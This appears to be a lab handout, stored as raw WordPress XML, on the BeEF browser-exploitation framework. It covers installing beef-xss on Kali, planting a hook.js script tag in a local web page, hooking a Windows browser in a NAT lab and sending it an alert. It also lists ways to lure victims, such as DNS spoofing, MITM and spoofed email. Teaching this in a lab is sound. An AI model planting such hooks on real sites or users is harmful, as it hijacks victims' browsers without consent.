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57776" w14:textId="6624447F" w:rsidR="00DE69C4" w:rsidRDefault="00394AD6" w:rsidP="00FE67A1">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc191729604"/>
      <w:r>
        <w:t>BeEF Client Side Attack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20764719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3927911" w14:textId="4334FA1F" w:rsidR="00914DC5" w:rsidRDefault="00914DC5">
          <w:pPr>
            <w:pStyle w:val="TOCHeading"/>
          </w:pPr>
          <w:r>
            <w:t>Contents</w:t>
          </w:r>
        </w:p>
        <w:p w14:paraId="5EF34164" w14:textId="70BD3619" w:rsidR="009A726C" w:rsidRDefault="00914DC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29604" w:history="1">
            <w:r w:rsidR="009A726C" w:rsidRPr="000569C1">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>BeEF Client Side Attack</w:t>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc191729604 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
            <w:r w:rsidR="009A726C">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="35207A10" w14:textId="39BE822D" w:rsidR="009A726C" w:rsidRDefault="009A726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1729605" w:history="1">
            <w:r w:rsidRPr="000569C1">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Install BeEf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7E65" w14:textId="5B4E3A25" w:rsidR="009A726C" w:rsidRDefault="009A726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1729606" w:history="1">
            <w:r w:rsidRPr="000569C1">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Setup BeEf Client Side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8C693" w14:textId="3CA4A356" w:rsidR="009A726C" w:rsidRDefault="009A726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1729607" w:history="1">
            <w:r w:rsidRPr="000569C1">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Hook the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E618" w14:textId="56C167EB" w:rsidR="009A726C" w:rsidRDefault="009A726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1729608" w:history="1">
            <w:r w:rsidRPr="000569C1">
              <w:rPr>
                <w:rStyle w:val="Hyperlink"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Attack the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07C0" w14:textId="024CF00D" w:rsidR="009A726C" w:rsidRDefault="009A726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1729609" w:history="1">
            <w:r w:rsidRPr="000569C1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54848" w14:textId="17F43335" w:rsidR="00BF5E4B" w:rsidRDefault="00914DC5" w:rsidP="00FA64AA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1763572" w14:textId="7A74367A" w:rsidR="00BF5E4B" w:rsidRDefault="00BF5E4B" w:rsidP="00BF5E4B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Time required: </w:t>
      </w:r>
      <w:r w:rsidR="000F4A0F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="005E0FCB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> minutes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A2FB852" w14:textId="1576E767" w:rsidR="008142E6" w:rsidRDefault="003C0502" w:rsidP="00BF5E4B">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Kali </w:t>
      </w:r>
      <w:r w:rsidR="008142E6">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Linux and Windows should be on the same NAT network</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> that we’ve been using.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004FE905" w14:textId="1B0FF80B" w:rsidR="00CB67F5" w:rsidRDefault="005F2B4E" w:rsidP="00B81E86">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc191729605"/>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Install BeEf</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="44751590" w14:textId="77777777" w:rsidR="00261D50" w:rsidRDefault="00360813" w:rsidP="00360813">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">At a terminal prompt: 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261D50" w14:paraId="4F5B3B3B" w14:textId="77777777" w:rsidTr="00261D50">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="78051113" w14:textId="4F22B5E7" w:rsidR="00261D50" w:rsidRDefault="00261D50" w:rsidP="00261D50">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo apt update</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DFE490A" w14:textId="6A07EA0B" w:rsidR="008F3157" w:rsidRDefault="008F3157" w:rsidP="00261D50">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r>
              <w:t>sudo apt dist-upgrade -y</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02C4B4DD" w14:textId="6BFD85DB" w:rsidR="00261D50" w:rsidRDefault="00261D50" w:rsidP="00261D50">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00261D50">
              <w:t>sudo apt install beef-xss</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E449CDD" w14:textId="57BFABF0" w:rsidR="00360813" w:rsidRPr="00EA086D" w:rsidRDefault="0078663C" w:rsidP="00360813">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to the menu </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Type </w:t>
      </w:r>
      <w:r w:rsidRPr="001A6694">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>beef</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="001A6694">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">beef </w:t>
      </w:r>
      <w:r w:rsidR="00FE1F5C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>xss</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="701A551E" w14:textId="458DA0F1" w:rsidR="00EA086D" w:rsidRPr="00EA086D" w:rsidRDefault="00EA086D" w:rsidP="00360813">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA086D">
        <w:t>Enter your credentials</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for sudo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0947E94C" w14:textId="3122A88A" w:rsidR="0078663C" w:rsidRDefault="00F1149E" w:rsidP="00360813">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Type in a different password for the beef user: Password02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19A89093" w14:textId="71A2181C" w:rsidR="00F1149E" w:rsidRDefault="008F6D87" w:rsidP="00360813">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>When the web browser interface shows up.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7283D2B2" w14:textId="10AB9E09" w:rsidR="008F6D87" w:rsidRDefault="008F6D87" w:rsidP="008F6D87">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Username: beef</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22DA8495" w14:textId="05D6D8AF" w:rsidR="008F6D87" w:rsidRDefault="008F6D87" w:rsidP="008F6D87">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="3"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Password: Password02</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E43552B" w14:textId="1560AF09" w:rsidR="008F6D87" w:rsidRDefault="005C1EB2" w:rsidP="00F455EF">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc191729606"/>
      <w:r>
        <w:t xml:space="preserve">Setup </w:t>
      </w:r>
      <w:r w:rsidR="00F455EF">
        <w:t>BeEf Client Side Attack</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="7A07E2E6" w14:textId="55C44669" w:rsidR="008C180F" w:rsidRDefault="002A5047" w:rsidP="008C180F">
      <w:r>
        <w:t xml:space="preserve">There are many ways to get the user to run </w:t>
      </w:r>
      <w:r w:rsidR="002B3FA6">
        <w:t>malicious</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> code. DNS spoof requests, MITM injection, spoofed email, or social engineer the target to open the hook page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0D8B3D" w14:textId="3C650A45" w:rsidR="0093030C" w:rsidRPr="008C180F" w:rsidRDefault="0093030C" w:rsidP="008C180F">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">We are going to change the local web site on Kali to include a malicious script that will hook the web browser of our </w:t>
      </w:r>
      <w:r w:rsidR="00045CC2">
        <w:t>victim</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> computer to our Beef program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="406DDDF7" w14:textId="1288EDB4" w:rsidR="00F455EF" w:rsidRPr="00234CCF" w:rsidRDefault="00A21112" w:rsidP="00A21112">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidR="00420677">
        <w:t xml:space="preserve">the Terminal: </w:t>
      </w:r>
      <w:r w:rsidR="00420677" w:rsidRPr="00420677">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">cd </w:t>
      </w:r>
      <w:r w:rsidRPr="00F0728A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/var/</w:t>
      </w:r>
      <w:r w:rsidR="00F0728A" w:rsidRPr="00F0728A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>www/html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E62228B" w14:textId="25BCA058" w:rsidR="00234CCF" w:rsidRDefault="00234CCF" w:rsidP="00234CCF">
      <w:r>
        <w:t xml:space="preserve">This is the folder where the files for </w:t>
      </w:r>
      <w:r w:rsidR="00C6733D">
        <w:t>apache2</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> web server </w:t>
      </w:r>
      <w:r w:rsidR="00C6733D">
        <w:t xml:space="preserve">on your local Kali Linux </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">is stored. </w:t>
      </w:r>
      <w:r w:rsidRPr="002B3FA6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>index.html</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is the default page that is loaded when someone browses to the web site.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C29176D" w14:textId="17314E66" w:rsidR="00234CCF" w:rsidRPr="00420677" w:rsidRDefault="00420677" w:rsidP="00234CCF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00420677">
        <w:t>Type:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> s</w:t>
      </w:r>
      <w:r w:rsidRPr="00420677">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">udo </w:t>
      </w:r>
      <w:r w:rsidR="00294D65">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>geany</w:t>
      </w:r>
      <w:r w:rsidRPr="00420677">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> index.html</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7879C48A" w14:textId="5006FC90" w:rsidR="00B649EA" w:rsidRDefault="00D33E26" w:rsidP="00234CCF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Delete all the text in the page.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520A75A1" w14:textId="4790B1E4" w:rsidR="00420677" w:rsidRDefault="00D33E26" w:rsidP="00234CCF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Insert the </w:t>
      </w:r>
      <w:r w:rsidR="00420677">
        <w:t xml:space="preserve">following </w:t>
      </w:r>
      <w:r>
        <w:t>script.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77" w14:paraId="6548F402" w14:textId="77777777" w:rsidTr="00134E46">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9350" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFD9" w:themeFill="accent6" w:themeFillTint="33"/>
          </w:tcPr>
          <w:p w14:paraId="764F8FB4" w14:textId="77777777" w:rsidR="00420677" w:rsidRDefault="00420677" w:rsidP="00134E46">
            <w:pPr>
              <w:pStyle w:val="Code"/>
            </w:pPr>
            <w:r w:rsidRPr="00933DE5">
              <w:t>&lt;script src=</w:t>
            </w:r>
            <w:r w:rsidRPr="00C25CFC">
              <w:t>"</w:t>
            </w:r>
            <w:r w:rsidRPr="00933DE5">
              <w:t>http://127.0.0.1:3000/hook.js</w:t>
            </w:r>
            <w:r w:rsidRPr="00C25CFC">
              <w:t>"</w:t>
            </w:r>
            <w:r w:rsidRPr="00933DE5">
              <w:t>&gt;&lt;/script&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="350DA6AD" w14:textId="4D9C98B0" w:rsidR="00420677" w:rsidRDefault="00D33E26" w:rsidP="00234CCF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Change the </w:t>
      </w:r>
      <w:r w:rsidR="00AE54FA">
        <w:t xml:space="preserve">127.0.0.1 </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">IP address to the </w:t>
      </w:r>
      <w:r w:rsidR="00B75D8A">
        <w:t xml:space="preserve">local </w:t>
      </w:r>
      <w:r>
        <w:t>IP address of your Kali machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3713FAFA" w14:textId="5B2706A7" w:rsidR="00D33E26" w:rsidRDefault="00420677" w:rsidP="00F3354A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00420677">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CTRL S</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to save</w:t>
      </w:r>
      <w:r w:rsidR="004C35ED">
        <w:t xml:space="preserve"> the file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="624F788A" w14:textId="64577FB3" w:rsidR="004C35ED" w:rsidRPr="00940E82" w:rsidRDefault="009A3DFD" w:rsidP="00234CCF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">At a terminal prompt, start the </w:t>
      </w:r>
      <w:r w:rsidR="00A71D61">
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:t>pache web se</w:t>
      </w:r>
      <w:r w:rsidR="00CA42D6">
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ver: </w:t>
      </w:r>
      <w:r w:rsidR="00CA42D6" w:rsidRPr="00CA42D6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">sudo </w:t>
      </w:r>
      <w:r w:rsidRPr="009A3DFD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>service apache2 start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146D3595" w14:textId="0EFC85E6" w:rsidR="00940E82" w:rsidRPr="00940E82" w:rsidRDefault="00940E82" w:rsidP="00234CCF">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00940E82">
        <w:t>The terminal prompt should</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> reappear quickly. Unless there is an error, you are good to go.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BCAD112" w14:textId="53BC4BB0" w:rsidR="00AC5B75" w:rsidRDefault="00AC5B75" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="3" w:name="_Toc191729607"/>
      <w:r>
        <w:t>Hook the Target</w:t>
      </w:r>
      <w:bookmarkEnd w:id="3"/>
    </w:p>
    <w:p w14:paraId="79B07DA5" w14:textId="66B6C5C2" w:rsidR="001E066A" w:rsidRPr="001E066A" w:rsidRDefault="001E066A" w:rsidP="001E066A">
      <w:r>
        <w:t xml:space="preserve">All these exploits were tested on </w:t>
      </w:r>
      <w:r w:rsidR="00016A44">
        <w:t>Edge</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="205F0B0E" w14:textId="04AAF1A3" w:rsidR="00AC5B75" w:rsidRDefault="00AC5B75" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Go to your Windows Target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D04A261" w14:textId="590B4A65" w:rsidR="00AC5B75" w:rsidRDefault="00D500C9" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In a web browser go to: </w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:history="1">
        <w:r w:rsidR="008C1982" w:rsidRPr="00866842">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>http://127.0.0.1</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> (Substitute your Kali IP for 127.0.0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2156FA0A" w14:textId="239A476F" w:rsidR="00D500C9" w:rsidRDefault="00652D16" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00341A42">
        <w:t xml:space="preserve">web </w:t>
      </w:r>
      <w:r>
        <w:t>page will be blank</w:t>
      </w:r>
      <w:r w:rsidR="001B62F1">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="009D6718">
        <w:t xml:space="preserve"> The script will run without any evidence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B8EC043" w14:textId="3ADE3A76" w:rsidR="001B62F1" w:rsidRDefault="0071030C" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to </w:t>
      </w:r>
      <w:r w:rsidRPr="0071030C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>BeEF</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in your Kali machine: You should see your Windows target machine IP address under </w:t>
      </w:r>
      <w:r w:rsidRPr="0071030C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Online Browsers</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DDF365E" w14:textId="4AF62D97" w:rsidR="00D7148B" w:rsidRDefault="00D7148B" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click on the target machine.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12415F2E" w14:textId="25119767" w:rsidR="00634C10" w:rsidRDefault="00634C10" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to the </w:t>
      </w:r>
      <w:r w:rsidRPr="005E1D6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Details</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tab </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="004066FC">
        <w:t>look</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> at the information about </w:t>
      </w:r>
      <w:r w:rsidR="002D379D">
        <w:t>the target web browser.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EEA07DC" w14:textId="245A9D55" w:rsidR="00276381" w:rsidRDefault="00276381" w:rsidP="00AC5B75">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="5"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Go to the </w:t>
      </w:r>
      <w:r w:rsidRPr="005E1D6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tab </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005E1D6E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Map</w:t>
      </w:r>
      <w:r>
        <w:t>. You will see a visual view of the connection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435299CC" w14:textId="4C9A9E77" w:rsidR="001853F4" w:rsidRDefault="001853F4" w:rsidP="001853F4">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc191729608"/>
      <w:r>
        <w:t>Attack the Target</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
    </w:p>
    <w:p w14:paraId="62BE178B" w14:textId="55C1519C" w:rsidR="001853F4" w:rsidRPr="00373BAD" w:rsidRDefault="00373BAD" w:rsidP="00373BAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In </w:t>
      </w:r>
      <w:r w:rsidRPr="0024680D">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>BeEf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00791CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Commands</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> tab </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00791CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Browser</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00373BAD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Create Alert Dialog</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B71E7B8" w14:textId="6CD056CB" w:rsidR="00373BAD" w:rsidRDefault="00791CC7" w:rsidP="00373BAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Type in a message in the Alert Text </w:t>
      </w:r>
      <w:r>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidRPr="00791CC7">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9EA78E" w14:textId="504C0EF6" w:rsidR="00791CC7" w:rsidRDefault="00791CC7" w:rsidP="00373BAD">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>There will be an alert on the Target machine.</w:t>
      </w:r>
    </w:p>
